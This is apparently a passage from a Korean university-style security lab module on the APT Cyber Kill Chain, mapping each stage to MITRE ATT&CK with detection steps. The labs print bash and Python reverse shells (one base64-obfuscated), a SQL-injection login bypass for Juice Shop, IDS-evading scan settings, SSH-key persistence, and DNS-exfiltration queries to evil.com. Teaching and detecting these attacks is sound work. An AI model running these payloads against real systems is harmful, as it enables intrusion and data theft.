# Week 01: APT 킬체인 심화 — Cyber Kill Chain 7단계 실전 매핑

## 학습 목표
- Lockheed Martin의 **Cyber Kill Chain** 7단계를 완벽히 이해하고 각 단계별 공격 기법을 매핑할 수 있다
- APT(Advanced Persistent Threat)의 특성과 일반 공격과의 차이점을 설명할 수 있다
- 실제 APT 그룹(APT28, APT29, Lazarus 등)의 킬체인 사례를 분석할 수 있다
- MITRE ATT&CK 프레임워크와 킬체인의 관계를 이해하고 매핑할 수 있다
- 각 킬체인 단계에서 **방어자(Blue Team)** 관점의 탐지·차단 포인트를 식별할 수 있다
- 킬체인 분석을 기반으로 공격 시뮬레이션 계획을 수립할 수 있다
- Unified Kill Chain, Diamond Model 등 확장 모델을 비교·설명할 수 있다

## 전제 조건
- 네트워크 기초(TCP/IP, DNS, HTTP)를 이해하고 있어야 한다
- Linux CLI 기본 명령어(ls, cat, grep, curl, wget)를 사용할 수 있어야 한다
- nmap, Wireshark 등 기본 도구 사용 경험이 있어야 한다
- MITRE ATT&CK 매트릭스의 기본 구조(전술-기법-절차)를 알고 있어야 한다

## 실습 환경

| 호스트 | IP | 역할 | 접속 |
|--------|-----|------|------|
| opsclaw | 10.20.30.201 | 실습 기지 (공격 출발점) | `ssh opsclaw@10.20.30.201` |
| secu | 10.20.30.1 | 방화벽/IPS | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 웹 서버 (대상) | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM 모니터링 | `sshpass -p1 ssh siem@10.20.30.100` |

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:35 | APT와 킬체인 개론 | 강의 |
| 0:35-1:10 | 킬체인 1~3단계 심화 + 실습 | 실습 |
| 1:10-1:20 | 휴식 | - |
| 1:20-1:55 | 킬체인 4~5단계 심화 + 실습 | 실습 |
| 1:55-2:30 | 킬체인 6~7단계 심화 + 실습 | 실습 |
| 2:30-2:40 | 휴식 | - |
| 2:40-3:10 | APT 시나리오 종합 실습 | 실습 |
| 3:10-3:30 | ATT&CK 매핑 + 퀴즈 + 과제 | 토론/퀴즈 |

---

# Part 1: APT와 Cyber Kill Chain 개론 (35분)

## 1.1 APT(Advanced Persistent Threat)란?

APT는 **고도로 조직화된 공격 그룹**이 특정 목표를 장기간에 걸쳐 은밀하게 공격하는 형태를 말한다.

### APT의 세 가지 속성

| 속성 | 의미 | 일반 공격과의 차이 |
|------|------|-------------------|
| **Advanced** (고급) | 제로데이, 커스텀 악성코드, 다단계 공격 | 알려진 취약점, 공개 도구 의존 |
| **Persistent** (지속적) | 수개월~수년 잠복, 재침투 반복 | 한 번 성공하면 종료 |
| **Threat** (위협) | 국가 지원, 명확한 목적(기밀 탈취 등) | 금전적 동기, 무차별 공격 |

### 주요 APT 그룹 사례

| 그룹명 | 배후 추정 | 대표 작전 | 주요 기법 |
|--------|----------|----------|----------|
| APT28 (Fancy Bear) | 러시아 GRU | DNC 해킹(2016) | 스피어피싱, 제로데이 |
| APT29 (Cozy Bear) | 러시아 SVR | SolarWinds(2020) | 공급망 공격, 합법 도구 |
| Lazarus Group | 북한 | 소니 픽처스(2014), WannaCry | 파괴형 악성코드 |
| APT41 (Winnti) | 중국 | 게임사 침해 + 정보수집 | 이중 목적(범죄+정보) |
| Kimsuky | 북한 | 한국 정부기관 대상 | 스피어피싱, 한글 문서 악용 |

## 1.2 Cyber Kill Chain 7단계 개요

Lockheed Martin이 2011년 발표한 모델로, 사이버 공격을 **7단계 연쇄 과정**으로 분해한다.

```
+------------------------------------------------------------------+
|                    Cyber Kill Chain 7단계                          |
+------------------------------------------------------------------+
| 1. Reconnaissance     정찰: 대상 정보 수집                        |
|    ↓                                                              |
| 2. Weaponization      무기화: 공격 도구/페이로드 제작              |
|    ↓                                                              |
| 3. Delivery           전달: 공격 도구를 대상에 전달                |
|    ↓                                                              |
| 4. Exploitation       익스플로잇: 취약점 이용하여 코드 실행        |
|    ↓                                                              |
| 5. Installation       설치: 지속성 확보 (백도어, RAT)              |
|    ↓                                                              |
| 6. Command & Control  명령 제어: C2 서버와 통신 채널 수립          |
|    ↓                                                              |
| 7. Actions on         목표 행동: 데이터 유출, 파괴, 측면 이동      |
|    Objectives                                                     |
+------------------------------------------------------------------+
```

### 킬체인의 핵심 원리: "체인을 끊어라"

킬체인의 가치는 **어느 한 단계라도 차단하면 공격 전체가 실패**한다는 점에 있다. 방어자는 각 단계별 탐지·차단 메커니즘을 구축해야 한다.

| 단계 | 공격자 행위 | 방어자 차단 수단 | MITRE ATT&CK 전술 |
|------|-----------|-----------------|-------------------|
| 1. 정찰 | 포트 스캔, OSINT | IDS 탐지, 노출 최소화 | Reconnaissance |
| 2. 무기화 | 악성 문서 제작 | 위협 인텔리전스 | Resource Development |
| 3. 전달 | 피싱 메일, 워터링홀 | 이메일 필터, 웹 프록시 | Initial Access |
| 4. 익스플로잇 | CVE 악용, 매크로 실행 | 패치 관리, DEP/ASLR | Execution |
| 5. 설치 | 백도어, 시작프로그램 | EDR, AppLocker | Persistence |
| 6. C2 | DNS 터널링, HTTPS C2 | 네트워크 모니터링 | Command and Control |
| 7. 목표 행동 | 데이터 유출, 랜섬웨어 | DLP, 네트워크 세그먼테이션 | Exfiltration, Impact |

## 1.3 킬체인 확장 모델

### Unified Kill Chain (UKC)

기존 킬체인을 **18단계**로 확장하여 내부 이동과 목표 달성 과정을 더 세분화한 모델이다.

```
[Initial Foothold]       [Network Propagation]      [Action on Objectives]
- Reconnaissance         - Discovery                - Collection
- Weaponization          - Privilege Escalation     - Exfiltration
- Social Engineering     - Lateral Movement         - Impact
- Exploitation           - Execution                - Objectives
- Persistence            - Credential Access
- Defense Evasion        - Pivoting
- Command & Control
```

### Diamond Model

공격을 **4가지 요소의 관계**로 분석하는 모델이다.

```
            Adversary (공격자)
               /        \
              /          \
    Infrastructure --- Capability
              \          /
               \        /
             Victim (피해자)
```

| 요소 | 설명 | 분석 예시 |
|------|------|----------|
| Adversary | 공격 주체 | APT28, Lazarus |
| Capability | 공격 도구/기법 | Mimikatz, CVE-2021-44228 |
| Infrastructure | C2, 경유지 | VPS, 봇넷, CDN 악용 |
| Victim | 피해 대상 | 특정 기업, 정부기관 |

---

# Part 2: 킬체인 1~3단계 심화 — 정찰·무기화·전달 (35분)

## 2.1 Stage 1: 정찰 (Reconnaissance)

정찰은 공격의 기반이다. APT 그룹은 수주~수개월에 걸쳐 정찰을 수행한다.

### 정찰 유형별 기법

| 유형 | 기법 | 도구 | ATT&CK ID |
|------|------|------|-----------|
| 수동 정찰 | OSINT, 소셜미디어 분석 | Maltego, theHarvester | T1593 |
| 수동 정찰 | DNS 레코드 수집 | dig, dnsenum | T1596.001 |
| 수동 정찰 | 기술 스택 핑거프린팅 | Wappalyzer, BuiltWith | T1592 |
| 능동 정찰 | 포트/서비스 스캔 | nmap, masscan | T1595.001 |
| 능동 정찰 | 취약점 스캐닝 | Nessus, nuclei | T1595.002 |
| 능동 정찰 | 디렉토리 열거 | gobuster, feroxbuster | T1595.003 |

### APT 수준의 정찰 특징

1. **느리고 분산된 스캔**: 하루에 소수 포트만 스캔하여 IDS 임계값 이하로 유지
2. **합법적 서비스 활용**: Shodan, Censys 등 제3자 서비스를 통한 간접 정찰
3. **내부자 정보 수집**: LinkedIn 프로필 분석, 채용 공고에서 기술 스택 파악
4. **장기 관찰**: 대상 조직의 업무 패턴, 보안 조직 구성 파악

## 실습 2.1: APT 스타일 저속 정찰 스캔

> **실습 목적**: 일반 스캔과 APT 스타일 저속 스캔의 차이를 체험하고, IDS 탐지 임계값과의 관계를 이해한다
>
> **배우는 것**: nmap의 타이밍 옵션(-T), 지연 설정(--scan-delay), 분할 스캔 등 IDS 회피를 위한 스캔 기법을 배운다
>
> **결과 해석**: 느린 스캔은 동일한 결과를 반환하지만 Suricata 알림 발생 빈도가 낮다
>
> **실전 활용**: 실제 APT 정찰 단계에서 탐지를 회피하기 위해 사용하는 저속 스캔 기법의 원리를 이해한다
>
> **명령어 해설**: -T0(paranoid)은 5분 간격으로 패킷을 보내며, --scan-delay로 패킷 간 지연을 세밀하게 조정한다
>
> **트러블슈팅**: 스캔이 너무 느리면 -T1(sneaky, 15초 간격)로 변경한다. 결과가 없으면 방화벽 규칙을 확인한다

```bash
# --- 일반 스캔 (빠르지만 탐지됨) ---
# 시간 측정과 함께 실행
time nmap -sS -T4 -p 22,80,443,3000,8002 10.20.30.80 2>/dev/null
# 예상 출력: 1~2초 내 완료, 모든 포트 결과 표시

# --- APT 스타일 저속 스캔 ---
# -T0 (paranoid): 5분 간격으로 패킷 전송
# 실습에서는 --scan-delay 10s로 대체 (시간 절약)
echo 1 | sudo -S nmap -sS --scan-delay 10s -p 22,80 10.20.30.80 2>/dev/null
# 예상 출력: 동일한 결과이지만 20초 이상 소요

# --- 분할 스캔: 여러 시간대에 나눠서 ---
# 실무에서는 하루에 5포트씩 나눠서 스캔
echo 1 | sudo -S nmap -sS --scan-delay 5s -p 22,80 10.20.30.80 2>/dev/null
echo 1 | sudo -S nmap -sS --scan-delay 5s -p 443,3000 10.20.30.80 2>/dev/null
echo 1 | sudo -S nmap -sS --scan-delay 5s -p 8002 10.20.30.80 2>/dev/null
```

## 실습 2.2: Suricata에서 정찰 탐지 확인

> **실습 목적**: 공격자의 정찰이 방어 측 IDS에 어떻게 기록되는지 확인하여, 공격-방어 양면을 이해한다
>
> **배우는 것**: Suricata 로그에서 스캔 탐지 알림을 읽고, 일반 스캔과 저속 스캔의 탐지 차이를 분석하는 방법을 배운다
>
> **결과 해석**: fast.log에 ET SCAN 규칙 매칭이 나타나면 IDS가 스캔을 탐지한 것이다
>
> **실전 활용**: Red Team은 탐지 로그를 확인하여 자신의 OPSEC(작전 보안)을 검증한다
>
> **명령어 해설**: tail -f는 실시간 로그 모니터링, grep ET SCAN은 스캔 관련 알림만 필터링한다
>
> **트러블슈팅**: fast.log가 비어있으면 Suricata 서비스 상태(systemctl status suricata)를 확인한다

```bash
# secu 서버에서 Suricata 알림 확인
sshpass -p1 ssh secu@10.20.30.1 \
  "tail -20 /var/log/suricata/fast.log 2>/dev/null | grep -i 'scan\|nmap' || echo 'No scan alerts found'"

# 일반 스캔 후 알림 발생 확인
echo 1 | sudo -S nmap -sS -T4 -p 1-100 10.20.30.80 2>/dev/null
sleep 3
sshpass -p1 ssh secu@10.20.30.1 \
  "tail -5 /var/log/suricata/fast.log 2>/dev/null || echo 'Log not available'"

# Wazuh에서도 확인
sshpass -p1 ssh siem@10.20.30.100 \
  "grep -i 'scan\|nmap' /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -3 | python3 -m json.tool 2>/dev/null || echo 'No alerts'"
```

## 2.2 Stage 2: 무기화 (Weaponization)

무기화는 정찰에서 수집한 정보를 바탕으로 **공격 도구와 페이로드를 제작**하는 단계이다.

### 무기화 기법 분류

| 유형 | 설명 | 예시 | ATT&CK ID |
|------|------|------|-----------|
| 악성 문서 | 매크로/DDE 포함 문서 | Word 매크로 → PowerShell | T1204.002 |
| 익스플로잇 킷 | 취약점 자동 익스플로잇 패키지 | RIG EK, Angler EK | T1189 |
| 커스텀 악성코드 | 전용 RAT/백도어 개발 | Cobalt Strike Beacon | T1587.001 |
| 합법 도구 무기화 | LOLBins 활용 | certutil, mshta, bitsadmin | T1218 |
| 워터링홀 준비 | 대상이 방문하는 사이트 변조 | 산업 포럼, 뉴스 사이트 | T1584.006 |

### APT별 무기화 특징

| 그룹 | 선호하는 무기 | 특징 |
|------|-------------|------|
| APT28 | X-Agent, Sedkit | 자체 개발 RAT, 0-day 적극 활용 |
| APT29 | SUNBURST, EnvyScout | 공급망 공격, HTML Smuggling |
| Lazarus | DTrack, BLINDINGCAN | 파괴형 + 정보수집 겸용 |
| Kimsuky | BabyShark, AppleSeed | 한글(.hwp) 문서 악용 |

## 실습 2.3: 간이 페이로드 제작 (교육용)

> **실습 목적**: 공격자가 무기화 단계에서 어떻게 페이로드를 생성하는지 원리를 이해한다
>
> **배우는 것**: 리버스 셸의 구조, base64 인코딩을 통한 난독화, msfvenom 페이로드 생성 원리를 배운다
>
> **결과 해석**: 생성된 스크립트가 대상에서 실행되면 공격자 서버로 역방향 연결이 수립된다
>
> **실전 활용**: 모의해킹에서 초기 접근(Initial Access) 달성 후 사용하는 기법이다
>
> **명령어 해설**: bash -i >& /dev/tcp/ 는 bash 내장 TCP 리다이렉션을 이용한 리버스 셸이다
>
> **트러블슈팅**: 리버스 셸이 연결되지 않으면 방화벽 규칙과 리스너 포트를 확인한다

```bash
# 교육용 리버스 셸 페이로드 (실제 실행하지 않음)
# 공격자가 제작하는 방식을 이해하기 위한 것
cat << 'PAYLOAD'
#!/bin/bash
# APT가 사용하는 리버스 셸 페이로드 예시 (교육용)
# 실제로는 이것을 악성 문서, 웹셸 등에 삽입

# 1단계: 기본 리버스 셸
bash -i >& /dev/tcp/10.20.30.201/4444 0>&1

# 2단계: base64 난독화 (AV 우회 시도)
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMC4zMC4yMDEvNDQ0NCAwPiYx" | base64 -d | bash

# 3단계: Python 리버스 셸 (bash가 차단된 경우)
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.20.30.201",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
PAYLOAD

# 실제 준비: 리스너 세팅 (공격 출발점)
# nc -lvnp 4444
# 이후 실습에서 이 리스너를 사용
echo "[교육] 페이로드 구조 확인 완료 - 실제 실행은 하지 않음"
```

## 2.3 Stage 3: 전달 (Delivery)

무기화된 페이로드를 **대상에게 전달**하는 단계이다.

### 전달 벡터 비교

| 벡터 | 성공률 | 탐지 난이도 | APT 선호도 | ATT&CK ID |
|------|--------|-----------|-----------|-----------|
| 스피어피싱 이메일 | 높음 | 중간 | 매우 높음 | T1566.001 |
| 워터링홀 | 중간 | 높음 | 높음 | T1189 |
| USB/물리 접근 | 낮음 | 매우 높음 | 특수 상황 | T1091 |
| 공급망 공격 | 낮음 | 매우 높음 | 증가 추세 | T1195 |
| 서비스 익스플로잇 | 중간 | 중간 | 높음 | T1190 |

## 실습 2.4: 웹 서비스 기반 전달 시뮬레이션

> **실습 목적**: 공격자가 웹 서비스를 통해 페이로드를 전달하는 과정을 시뮬레이션한다
>
> **배우는 것**: HTTP 서버를 통한 파일 배포, curl/wget을 이용한 다운로드, 웹 기반 전달의 탐지 포인트를 배운다
>
> **결과 해석**: 대상이 HTTP GET 요청으로 페이로드를 다운로드하면 전달이 성공한 것이다
>
> **실전 활용**: 실제 APT는 합법적 클라우드 서비스(Google Drive, Dropbox)를 경유지로 활용한다
>
> **명령어 해설**: python3 -m http.server는 간이 HTTP 서버를 구동하며, curl -O는 파일을 다운로드한다
>
> **트러블슈팅**: 다운로드가 실패하면 방화벽(nftables) 규칙에서 해당 포트가 열려있는지 확인한다

```bash
# 공격자 서버에서 간이 HTTP 서버 구동 (백그라운드)
mkdir -p /tmp/apt_delivery
echo '#!/bin/bash
echo "[교육] 이것은 시뮬레이션 페이로드입니다"
hostname
whoami
id' > /tmp/apt_delivery/update.sh
chmod +x /tmp/apt_delivery/update.sh

# HTTP 서버 시작 (교육용)
cd /tmp/apt_delivery && python3 -m http.server 8888 &
HTTP_PID=$!
sleep 2

# 대상에서 다운로드 시뮬레이션
curl -s http://10.20.30.201:8888/update.sh -o /tmp/test_payload.sh
cat /tmp/test_payload.sh

# 정리
kill $HTTP_PID 2>/dev/null
rm -f /tmp/test_payload.sh /tmp/apt_delivery/update.sh
rmdir /tmp/apt_delivery 2>/dev/null
echo "[전달 시뮬레이션 완료]"
```

---

# Part 3: 킬체인 4~5단계 심화 — 익스플로잇·설치 (35분)

## 3.1 Stage 4: 익스플로잇 (Exploitation)

전달된 페이로드가 **대상 시스템의 취약점을 이용하여 코드를 실행**하는 단계이다.

### 익스플로잇 유형

| 유형 | 설명 | 예시 CVE | ATT&CK ID |
|------|------|---------|-----------|
| 메모리 손상 | 버퍼 오버플로, UAF | CVE-2021-3156 (sudo) | T1203 |
| 웹 취약점 | SQLi, XSS, RCE | CVE-2021-44228 (Log4j) | T1190 |
| 사용자 실행 | 매크로, 클릭 유도 | 피싱 문서 실행 | T1204 |
| 인증 우회 | 기본 비밀번호, 약한 인증 | CVE-2020-1472 (Zerologon) | T1078 |
| 디시리얼라이제이션 | 직렬화 객체 악용 | CVE-2015-5254 (ActiveMQ) | T1059 |

### 익스플로잇 체인

현대 APT는 단일 취약점이 아닌 **여러 취약점을 연결**하여 공격한다.

```
[취약점 1: XSS]
    ↓ 세션 쿠키 탈취
[취약점 2: SSRF]
    ↓ 내부 서비스 접근
[취약점 3: 디시리얼라이제이션 RCE]
    ↓ 코드 실행
[결과: 서버 장악]
```

## 실습 3.1: 웹 애플리케이션 익스플로잇 시뮬레이션

> **실습 목적**: Juice Shop의 알려진 취약점을 통해 익스플로잇 단계의 실제 과정을 체험한다
>
> **배우는 것**: SQL Injection을 통한 인증 우회, XSS를 통한 세션 탈취 원리를 실습한다
>
> **결과 해석**: 로그인 없이 관리자 권한을 획득하면 익스플로잇이 성공한 것이다
>
> **실전 활용**: 모의해킹에서 웹 애플리케이션의 취약점을 통한 초기 접근 확보에 활용한다
>
> **명령어 해설**: curl -X POST로 조작된 입력을 전송하며, ' OR 1=1-- 은 SQL 논리를 변조한다
>
> **트러블슈팅**: 응답이 없으면 Juice Shop 서비스 상태(port 3000)를 확인한다

```bash
# Juice Shop SQL Injection을 통한 인증 우회
# 정상 로그인 시도 (실패 예상)
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"wrong"}' | python3 -m json.tool 2>/dev/null

# SQL Injection으로 인증 우회
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'\'' OR 1=1--","password":"anything"}' | python3 -m json.tool 2>/dev/null
# 예상 출력: authentication 객체에 token 포함 → 익스플로잇 성공

# 킬체인 관점: 이 토큰이 다음 단계(설치)의 시작점
echo "[익스플로잇 단계 완료 - 인증 우회 성공 시 토큰 획득]"
```

## 실습 3.2: SIEM에서 익스플로잇 탐지 확인

> **실습 목적**: 익스플로잇 시도가 SIEM에 어떻게 기록되는지 확인하여, 탐지 관점을 습득한다
>
> **배우는 것**: Wazuh 알림 로그에서 SQL Injection 등 공격 시그니처를 식별하는 방법을 배운다
>
> **결과 해석**: rule.description에 SQL injection 관련 문자열이 나타나면 탐지 성공이다
>
> **실전 활용**: Blue Team은 이 알림을 기반으로 인시던트 대응을 시작한다
>
> **명령어 해설**: alerts.json을 grep하여 특정 패턴의 알림만 필터링하는 기법이다
>
> **트러블슈팅**: 알림이 없으면 Wazuh 에이전트 상태와 웹 서버 로그 전달 설정을 확인한다

```bash
# Wazuh에서 웹 공격 탐지 확인
sshpass -p1 ssh siem@10.20.30.100 \
  "grep -i 'sql\|injection\|xss' /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -3 | python3 -m json.tool 2>/dev/null || echo 'No web attack alerts'"

# Apache 액세스 로그에서 공격 흔적 확인
sshpass -p1 ssh web@10.20.30.80 \
  "tail -10 /var/log/apache2/access.log 2>/dev/null || tail -10 /var/log/nginx/access.log 2>/dev/null || echo 'No web logs'"
```

## 3.2 Stage 5: 설치 (Installation)

익스플로잇 성공 후 **지속적인 접근을 확보**하는 단계이다. 시스템 재부팅 후에도 접근이 유지되어야 한다.

### 지속성 기법 분류

| 기법 | Linux | Windows | ATT&CK ID |
|------|-------|---------|-----------|
| 크론잡/스케줄 작업 | crontab | Task Scheduler | T1053 |
| 시스템 서비스 | systemd unit | Windows Service | T1543 |
| 시작 스크립트 | .bashrc, rc.local | Startup folder | T1547 |
| 웹셸 | PHP/JSP 웹셸 | ASPX 웹셸 | T1505.003 |
| SSH 키 삽입 | authorized_keys | - | T1098.004 |
| 커널 모듈 | LKM rootkit | 드라이버 | T1547.006 |
| 계정 생성 | useradd | net user | T1136 |

## 실습 3.3: 지속성 기법 시뮬레이션 (로컬)

> **실습 목적**: APT가 사용하는 주요 지속성 기법을 안전한 환경에서 직접 설정하고 탐지하는 방법을 익힌다
>
> **배우는 것**: crontab, systemd, authorized_keys 등 지속성 메커니즘의 설치와 탐지 기법을 배운다
>
> **결과 해석**: 크론잡이나 서비스가 등록되면 재부팅 후에도 공격자 접근이 유지된다
>
> **실전 활용**: 인시던트 대응 시 지속성 메커니즘을 찾아 제거하는 것이 핵심 작업이다
>
> **명령어 해설**: crontab -l은 현재 크론잡 목록 확인, systemctl list-unit-files는 서비스 목록 확인이다
>
> **트러블슈팅**: 크론잡이 등록되지 않으면 cron 서비스 상태를 확인한다

```bash
# 지속성 기법 1: 크론잡 (교육용, 무해한 명령)
echo "# [교육] APT 지속성 시뮬레이션 - 1분마다 비콘" > /tmp/apt_cron_demo.txt
echo "*/1 * * * * echo 'beacon' >> /tmp/apt_beacon.log 2>/dev/null" >> /tmp/apt_cron_demo.txt
cat /tmp/apt_cron_demo.txt
echo ""
echo "[설명] 실제 APT는 이 자리에 C2 콜백 스크립트를 넣음"

# 지속성 기법 2: .bashrc 삽입 (교육용, 실행하지 않음)
echo ""
echo "# [교육] .bashrc 백도어 예시 (실행 안 함)"
echo 'echo "export PATH=\$PATH:/tmp/.hidden_tools" >> ~/.bashrc'
echo "[설명] 로그인할 때마다 공격자 도구 경로가 추가됨"

# 지속성 기법 3: SSH 키 삽입 (교육용)
echo ""
echo "# [교육] SSH 키 기반 백도어"
echo 'echo "ssh-rsa AAAA...공격자키..." >> ~/.ssh/authorized_keys'
echo "[설명] 비밀번호 없이 SSH 접속 가능"

# 탐지 방법 확인
echo ""
echo "=== 지속성 탐지 체크리스트 ==="
echo "1. crontab -l (사용자별 크론잡)"
echo "2. ls -la /etc/cron.d/ /etc/cron.daily/ (시스템 크론)"
echo "3. systemctl list-unit-files --state=enabled (서비스)"
echo "4. cat ~/.bashrc (셸 설정)"
echo "5. cat ~/.ssh/authorized_keys (SSH 키)"

# 정리
rm -f /tmp/apt_cron_demo.txt /tmp/apt_beacon.log
```

---

# Part 4: 킬체인 6~7단계 심화 — C2·목표 행동 + 종합 시나리오 (35분)

## 4.1 Stage 6: 명령과 제어 (Command and Control)

설치된 임플란트가 **공격자의 C2 서버와 통신 채널을 수립**하는 단계이다.

### C2 통신 유형

| 프로토콜 | 은닉성 | 대역폭 | 탐지 난이도 | ATT&CK ID |
|---------|--------|--------|-----------|-----------|
| HTTP/HTTPS | 높음 | 높음 | 중간 | T1071.001 |
| DNS 터널링 | 매우 높음 | 낮음 | 높음 | T1071.004 |
| ICMP 터널링 | 높음 | 낮음 | 높음 | T1095 |
| 웹소켓 | 높음 | 높음 | 중간 | T1071.001 |
| 클라우드 서비스 | 매우 높음 | 중간 | 매우 높음 | T1102 |
| 소셜미디어 | 매우 높음 | 매우 낮음 | 매우 높음 | T1102.002 |

### C2 아키텍처 유형

```
[중앙 집중형]                    [P2P 분산형]
공격자 → C2서버 → 임플란트       공격자 → 봇A ↔ 봇B ↔ 봇C
           ↓                          ↕       ↕
         임플란트                    봇D ↔ 봇E
    (단일 장애점 존재)           (회복력 높음, 추적 어려움)

[다단계 리디렉터]
공격자 → CDN → 리디렉터1 → 리디렉터2 → 임플란트
         (합법 트래픽에 숨김)
```

## 실습 4.1: HTTP 기반 C2 시뮬레이션

> **실습 목적**: 가장 보편적인 HTTP 기반 C2 통신의 원리를 이해하고, 탐지 포인트를 파악한다
>
> **배우는 것**: HTTP Polling 방식의 C2 통신 구조, 비콘 간격, 명령 전달/결과 회수 과정을 배운다
>
> **결과 해석**: 주기적인 HTTP 요청이 발생하면 C2 비콘이 동작하는 것이다
>
> **실전 활용**: 네트워크 모니터링에서 주기적 HTTP 요청 패턴을 탐지하면 C2 통신을 발견할 수 있다
>
> **명령어 해설**: while 루프로 주기적 HTTP 요청을 보내 C2 비콘을 시뮬레이션한다
>
> **트러블슈팅**: 연결이 거부되면 대상 서버의 HTTP 서비스 상태를 확인한다

```bash
# 간이 C2 서버 시뮬레이션 (교육용)
# 1. C2 서버 역할의 간이 HTTP 서버
mkdir -p /tmp/c2_demo
echo '{"command": "whoami", "interval": 30}' > /tmp/c2_demo/task.json
cd /tmp/c2_demo && python3 -m http.server 9999 &
C2_PID=$!
sleep 2

# 2. 비콘 시뮬레이션 (3회 폴링)
for i in 1 2 3; do
  echo "[비콘 $i] C2 서버에 체크인..."
  TASK=$(curl -s http://localhost:9999/task.json 2>/dev/null)
  echo "  수신 명령: $TASK"
  # 실제 C2에서는 여기서 명령을 실행하고 결과를 다시 POST
  CMD=$(echo "$TASK" | python3 -c "import sys,json;print(json.load(sys.stdin).get('command',''))" 2>/dev/null)
  echo "  실행 결과: $(eval "$CMD" 2>/dev/null)"
  sleep 2
done

# 정리
kill $C2_PID 2>/dev/null
rm -rf /tmp/c2_demo
echo "[C2 시뮬레이션 완료]"
```

## 실습 4.2: DNS 기반 C2 원리 이해

> **실습 목적**: DNS 프로토콜을 이용한 은닉 C2 통신의 원리를 이해한다
>
> **배우는 것**: DNS 쿼리에 데이터를 인코딩하여 전송하는 기법과 그 탐지 방법을 배운다
>
> **결과 해석**: 비정상적으로 긴 서브도메인 쿼리가 발생하면 DNS 터널링이 의심된다
>
> **실전 활용**: DNS 트래픽 분석을 통해 은닉 C2 채널을 탐지하는 데 활용한다
>
> **명령어 해설**: base64 인코딩된 데이터를 서브도메인으로 변환하여 DNS 쿼리에 삽입한다
>
> **트러블슈팅**: dig 명령이 동작하지 않으면 DNS 서버 설정(/etc/resolv.conf)을 확인한다

```bash
# DNS 터널링 원리 설명 (실제 DNS 서버 불필요)
echo "=== DNS C2 터널링 원리 ==="
echo ""

# 데이터를 DNS 쿼리로 인코딩하는 예시
DATA="hostname=$(hostname)"
ENCODED=$(echo "$DATA" | base64 | tr '+/' '-_' | tr -d '=')
echo "원본 데이터: $DATA"
echo "인코딩: $ENCODED"
echo "DNS 쿼리: $ENCODED.c2.attacker.com"
echo ""

# 실제 쿼리 예시 (교육용, 외부 DNS 서버 불필요)
echo "실제 APT가 보내는 DNS 쿼리 예시:"
echo "  aG9zdG5hbWU9d2Vi.data.evil.com    (TXT 쿼리)"
echo "  5468697320697320.exfil.evil.com    (A 쿼리)"
echo ""

echo "=== DNS C2 탐지 포인트 ==="
echo "1. 비정상적으로 긴 서브도메인 (>30자)"
echo "2. 높은 빈도의 TXT 레코드 쿼리"
echo "3. 존재하지 않는 도메인에 대한 반복 쿼리"
echo "4. 단일 도메인에 대한 과도한 쿼리"
```

## 4.2 Stage 7: 목표 행동 (Actions on Objectives)

킬체인의 최종 단계로, 공격자가 **본래 목적을 달성**하는 단계이다.

### 목표 행동 유형

| 목표 | 기법 | 예시 | ATT&CK 전술 |
|------|------|------|------------|
| 데이터 유출 | 암호화 채널, DNS exfil | 고객 DB 탈취 | Exfiltration |
| 파괴/방해 | 와이퍼, 랜섬웨어 | NotPetya, WannaCry | Impact |
| 측면 이동 | PtH, 토큰 탈취 | 도메인 컨트롤러 장악 | Lateral Movement |
| 정보 수집 | 키로거, 스크린샷 | 장기 모니터링 | Collection |
| 인프라 악용 | 크립토마이닝, 봇넷 | 자원 탈취 | Impact |

## 실습 4.3: 킬체인 종합 시나리오 매핑

> **실습 목적**: 실제 APT 캠페인을 킬체인 7단계에 매핑하여 전체 공격 흐름을 이해한다
>
> **배우는 것**: SolarWinds 공급망 공격을 사례로 각 킬체인 단계를 분석하는 방법을 배운다
>
> **결과 해석**: 각 단계가 명확히 매핑되면 어디서 차단할 수 있었는지 파악할 수 있다
>
> **실전 활용**: 위협 인텔리전스 분석 보고서 작성 시 킬체인 매핑을 활용한다
>
> **명령어 해설**: 이 실습은 분석 중심으로, 구조화된 출력을 생성한다
>
> **트러블슈팅**: 해당 없음 (분석 실습)

```bash
# SolarWinds 공격(APT29) 킬체인 매핑 분석
cat << 'ANALYSIS'
================================================================
SolarWinds 공급망 공격 (2020) — Cyber Kill Chain 매핑
================================================================

1. 정찰 (Reconnaissance)
   - SolarWinds Orion 제품의 빌드 시스템 구조 파악
   - 고객사 목록 (미국 정부기관, Fortune 500) 확인
   - ATT&CK: T1591 (Gather Victim Org Info)

2. 무기화 (Weaponization)
   - SUNBURST 백도어 코드 개발 (C# DLL)
   - 합법적 SolarWinds 코드와 구별 불가하게 작성
   - 12~14일 휴면 기간 내장 (샌드박스 회피)
   - ATT&CK: T1587.001 (Develop Capabilities: Malware)

3. 전달 (Delivery)
   - SolarWinds 빌드 서버에 악성 코드 삽입
   - 정상 업데이트 채널을 통해 18,000+ 조직에 배포
   - 합법적 코드 서명 인증서 사용
   - ATT&CK: T1195.002 (Supply Chain Compromise)

4. 익스플로잇 (Exploitation)
   - Orion 소프트웨어 업데이트 시 SUNBURST DLL 로드
   - 사용자 개입 불필요 (자동 업데이트)
   - ATT&CK: T1072 (Software Deployment Tools)

5. 설치 (Installation)
   - SUNBURST → TEARDROP/RAINDROP 2차 페이로드 설치
   - Cobalt Strike Beacon 배포
   - 합법적 프로세스에 주입 (프로세스 할로잉)
   - ATT&CK: T1055 (Process Injection)

6. C2 (Command and Control)
   - DNS CNAME을 통한 초기 통신 (avsvmcloud.com)
   - HTTPS를 통한 주 C2 채널
   - 통신 간격 12~14일 (느린 비콘)
   - ATT&CK: T1071.001, T1071.004

7. 목표 행동 (Actions on Objectives)
   - SAML 토큰 위조 (Golden SAML)
   - 이메일, 문서 등 기밀 정보 탈취
